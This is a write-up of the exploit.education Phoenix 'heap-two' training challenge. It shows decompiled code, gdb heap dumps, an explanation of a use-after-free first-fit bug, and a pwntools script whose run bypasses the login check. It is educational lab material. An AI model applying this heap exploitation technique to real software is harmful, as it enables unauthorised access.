# &#35; heap-2

#### &#42; pseudocode using ghidra
```bash

undefined4 main(void)

{
  char *pcVar1;
  int iVar2;
  size_t sVar3;
  char local_90 [5];
  char acStack139 [2];
  char acStack137 [125];
  undefined *local_c;
  
  local_c = &stack0x00000004;
  puts("Welcome to phoenix/heap-two, brought to you by https://exploit.education");
  while( true ) {
    printf("[ auth = %p, service = %p ]\n",auth,service);
    pcVar1 = fgets(local_90,0x80,stdin);
    if (pcVar1 == (char *)0x0) break;
    iVar2 = strncmp(local_90,"auth ",5);
    if (iVar2 == 0) {
      auth = (char *)malloc(0x24);
      memset(auth,0,0x24);
      sVar3 = strlen(acStack139);
      if (sVar3 < 0x1f) {
        strcpy(auth,acStack139);
      }
    }
    iVar2 = strncmp(local_90,"reset",5);
    if (iVar2 == 0) {
      free(auth);
    }
    iVar2 = strncmp(local_90,"service",6);
    if (iVar2 == 0) {
      service = strdup(acStack137);
    }
    iVar2 = strncmp(local_90,"login",5);
    if (iVar2 == 0) {
      if ((auth == (char *)0x0) || (*(int *)(auth + 0x20) == 0)) {
        puts("please enter your password");
      }
      else {
        puts("you have logged in already!");
      }
    }
  }
  return 0;
}


```


#### &#42; check to binary
```bash
$ file /opt/phoenix/i486/heap-two
/opt/phoenix/i486/heap-two: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped


```



#### &#42; how it work
```bash
$ /opt/phoenix/i486/heap-two AAAA
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
$

$ /opt/phoenix/i486/heap-two
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]

```


#### &#42; vulnerable point
```bash
#### we can overwrite auth area using uaf(use after free) first fit
```


#### &#42; heap structure
#### &auth-string[4] + &service-string[4] + dummy[20] + auth-string[36] + service-string[strdup]
```bash

$ gdb /opt/phoenix/i486/heap-two -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/heap-two...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x08048675 <+0>:	lea    ecx,[esp+0x4]
   0x08048679 <+4>:	and    esp,0xfffffff0
   0x0804867c <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804867f <+10>:	push   ebp
   0x08048680 <+11>:	mov    ebp,esp
   0x08048682 <+13>:	push   ecx
   0x08048683 <+14>:	sub    esp,0x84
   0x08048689 <+20>:	sub    esp,0xc
   0x0804868c <+23>:	push   0x8048870
   0x08048691 <+28>:	call   0x8048460 <puts@plt>
   0x08048696 <+33>:	add    esp,0x10
   0x08048699 <+36>:	mov    edx,DWORD PTR ds:0x8049ae0     => service
   0x0804869f <+42>:	mov    eax,ds:0x8049adc               => auth
   0x080486a4 <+47>:	sub    esp,0x4
   0x080486a7 <+50>:	push   edx
   0x080486a8 <+51>:	push   eax
   0x080486a9 <+52>:	push   0x80488b9
   0x080486ae <+57>:	call   0x8048440 <printf@plt>
   0x080486b3 <+62>:	add    esp,0x10
   0x080486b6 <+65>:	mov    eax,ds:0x8049ab8
   0x080486bb <+70>:	sub    esp,0x4
   0x080486be <+73>:	push   eax
   0x080486bf <+74>:	push   0x80
   0x080486c4 <+79>:	lea    eax,[ebp-0x88]
   0x080486ca <+85>:	push   eax
   0x080486cb <+86>:	call   0x8048450 <fgets@plt>
   0x080486d0 <+91>:	add    esp,0x10
   0x080486d3 <+94>:	test   eax,eax
   0x080486d5 <+96>:	je     0x8048817 <main+418>
   0x080486db <+102>:	sub    esp,0x4
   0x080486de <+105>:	push   0x5
   0x080486e0 <+107>:	push   0x80488d6
   0x080486e5 <+112>:	lea    eax,[ebp-0x88]
   0x080486eb <+118>:	push   eax
   0x080486ec <+119>:	call   0x8048480 <strncmp@plt>
   0x080486f1 <+124>:	add    esp,0x10
   0x080486f4 <+127>:	test   eax,eax
   0x080486f6 <+129>:	jne    0x8048755 <main+224>
   0x080486f8 <+131>:	sub    esp,0xc
   0x080486fb <+134>:	push   0x24
   0x080486fd <+136>:	call   0x8048470 <malloc@plt>
   0x08048702 <+141>:	add    esp,0x10
   0x08048705 <+144>:	mov    ds:0x8049adc,eax
   0x0804870a <+149>:	mov    eax,ds:0x8049adc
   0x0804870f <+154>:	sub    esp,0x4
   0x08048712 <+157>:	push   0x24
   0x08048714 <+159>:	push   0x0
   0x08048716 <+161>:	push   eax
   0x08048717 <+162>:	call   0x80484a0 <memset@plt>
   0x0804871c <+167>:	add    esp,0x10
   0x0804871f <+170>:	lea    eax,[ebp-0x88]
   0x08048725 <+176>:	add    eax,0x5
   0x08048728 <+179>:	sub    esp,0xc
   0x0804872b <+182>:	push   eax
   0x0804872c <+183>:	call   0x80484c0 <strlen@plt>
   0x08048731 <+188>:	add    esp,0x10
   0x08048734 <+191>:	cmp    eax,0x1e
   0x08048737 <+194>:	ja     0x8048755 <main+224>
   0x08048739 <+196>:	lea    eax,[ebp-0x88]
   0x0804873f <+202>:	add    eax,0x5
   0x08048742 <+205>:	mov    edx,DWORD PTR ds:0x8049adc
   0x08048748 <+211>:	sub    esp,0x8
   0x0804874b <+214>:	push   eax
   0x0804874c <+215>:	push   edx
   0x0804874d <+216>:	call   0x8048430 <strcpy@plt>
   0x08048752 <+221>:	add    esp,0x10
   0x08048755 <+224>:	sub    esp,0x4
   0x08048758 <+227>:	push   0x5
   0x0804875a <+229>:	push   0x80488dc
   0x0804875f <+234>:	lea    eax,[ebp-0x88]
   0x08048765 <+240>:	push   eax
   0x08048766 <+241>:	call   0x8048480 <strncmp@plt>
   0x0804876b <+246>:	add    esp,0x10
   0x0804876e <+249>:	test   eax,eax
   0x08048770 <+251>:	jne    0x8048783 <main+270>
   0x08048772 <+253>:	mov    eax,ds:0x8049adc
   0x08048777 <+258>:	sub    esp,0xc
   0x0804877a <+261>:	push   eax
   0x0804877b <+262>:	call   0x80484d0 <free@plt>
   0x08048780 <+267>:	add    esp,0x10
   0x08048783 <+270>:	sub    esp,0x4
   0x08048786 <+273>:	push   0x6
   0x08048788 <+275>:	push   0x80488e2
   0x0804878d <+280>:	lea    eax,[ebp-0x88]
   0x08048793 <+286>:	push   eax
   0x08048794 <+287>:	call   0x8048480 <strncmp@plt>
   0x08048799 <+292>:	add    esp,0x10
   0x0804879c <+295>:	test   eax,eax
   0x0804879e <+297>:	jne    0x80487ba <main+325>
   0x080487a0 <+299>:	lea    eax,[ebp-0x88]
   0x080487a6 <+305>:	add    eax,0x7
   0x080487a9 <+308>:	sub    esp,0xc
   0x080487ac <+311>:	push   eax
   0x080487ad <+312>:	call   0x8048490 <strdup@plt>
   0x080487b2 <+317>:	add    esp,0x10
   0x080487b5 <+320>:	mov    ds:0x8049ae0,eax
   0x080487ba <+325>:	sub    esp,0x4
   0x080487bd <+328>:	push   0x5
   0x080487bf <+330>:	push   0x80488ea
   0x080487c4 <+335>:	lea    eax,[ebp-0x88]
   0x080487ca <+341>:	push   eax
   0x080487cb <+342>:	call   0x8048480 <strncmp@plt>
   0x080487d0 <+347>:	add    esp,0x10
   0x080487d3 <+350>:	test   eax,eax
   0x080487d5 <+352>:	jne    0x8048699 <main+36>
   0x080487db <+358>:	mov    eax,ds:0x8049adc
   0x080487e0 <+363>:	test   eax,eax
   0x080487e2 <+365>:	je     0x8048802 <main+397>
   0x080487e4 <+367>:	mov    eax,ds:0x8049adc
   0x080487e9 <+372>:	mov    eax,DWORD PTR [eax+0x20]
   0x080487ec <+375>:	test   eax,eax
   0x080487ee <+377>:	je     0x8048802 <main+397>
   0x080487f0 <+379>:	sub    esp,0xc
   0x080487f3 <+382>:	push   0x80488f0
   0x080487f8 <+387>:	call   0x8048460 <puts@plt>
   0x080487fd <+392>:	add    esp,0x10
   0x08048800 <+395>:	jmp    0x8048812 <main+413>
   0x08048802 <+397>:	sub    esp,0xc
   0x08048805 <+400>:	push   0x804890c
   0x0804880a <+405>:	call   0x8048460 <puts@plt>
   0x0804880f <+410>:	add    esp,0x10
   0x08048812 <+413>:	jmp    0x8048699 <main+36>
   0x08048817 <+418>:	nop
   0x08048818 <+419>:	mov    eax,0x0
   0x0804881d <+424>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048820 <+427>:	leave
   0x08048821 <+428>:	lea    esp,[ecx-0x4]
   0x08048824 <+431>:	ret
End of assembler dump.
gef>

gef> x/12xw 0x8049ae0
0x8049ae0 <service>:	0x00000000	0x00000000	0x00000001	0x00000510
0x8049af0:	0xf7ffb958	0xf7ffb958	0x00000000	0x00000000
0x8049b00:	0x00000000	0x00000000	0x00000000	0x00000000
gef> x/12xw 0x8049adc
0x8049adc <auth>:	0x00000000	0x00000000	0x00000000	0x00000001
0x8049aec:	0x00000510	0xf7ffb958	0xf7ffb958	0x00000000
0x8049afc:	0x00000000	0x00000000	0x00000000	0x00000000
gef>

gef> r
Starting program: /opt/phoenix/i486/heap-two
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
auth AAAA
[ auth = 0x8049af0, service = 0 ]
serviceBBBB
[ auth = 0x8049af0, service = 0x8049b20 ]

## auth area(0x08049af0) and service area(0x08049b20)
gef> x/52xw 0x8049adc
0x8049adc <auth>:	0x08049af0	0x08049b20	0x00000000	0x00000001
0x8049aec:	0x00000031	0x41414141	0x0000000a	0x00000000
0x8049afc:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049b0c:	0x00000000	0x00000000	0x00000000	0x00000031
0x8049b1c:	0x00000011	0x42424242	0xf7ff000a	0x00000011
0x8049b2c:	0x000004d0	0xf7ffb948	0xf7ffb948	0x00000000
0x8049b3c:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049b4c:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049b5c:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049b6c:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049b7c:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049b8c:	0x00000000	0x00000000	0x00000000	0x00000000
0x8049b9c:	0x00000000	0x00000000	0x00000000	0x00000000


```

#### &#42; payload
```bash
#### &auth-string[4] + &service-string[4] + dummy[20] + auth-string[36] + service-string[strdup]
#### 1-auth > 2-reset > 3-service
#### we can overwrite auth area because service malloc using strdup() : uaf first fit
payload1  = b"auth AAAA"
payload2  = b"reset"
payload3  = b"service"+b"A"*32
payload4  = b"login"

```

#### &#42; exploit code
```bash
$ cat exp_heap2.py
from pwn import *

context.arch='i386'
#context.log_level='debug'

filename="/opt/phoenix/i486/heap-two"
conn = process(filename)

payload1  = b"auth AAAA"
payload2  = b"reset"
payload3  = b"service"+b"A"*32
payload4  = b"login"

conn = process(filename)
print( conn.recvuntil("]") )
conn.sendline(payload1)

print( conn.recvuntil("]") )
conn.sendline(payload2)

print( conn.recvuntil("]") )
conn.sendline(payload3)

print( conn.recvuntil("]") )
conn.sendline(payload4)


conn.interactive()



$ python exp_heap2.py
[+] Starting local process '/opt/phoenix/i486/heap-two': pid 479
[+] Starting local process '/opt/phoenix/i486/heap-two': pid 481
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]

[ auth = 0x8049af0, service = 0 ]

[ auth = 0x8049af0, service = 0 ]

[ auth = 0x8049af0, service = 0x8049af0 ]
[*] Switching to interactive mode

you have logged in already!
[ auth = 0x8049af0, service = 0x8049af0 ]
$
```


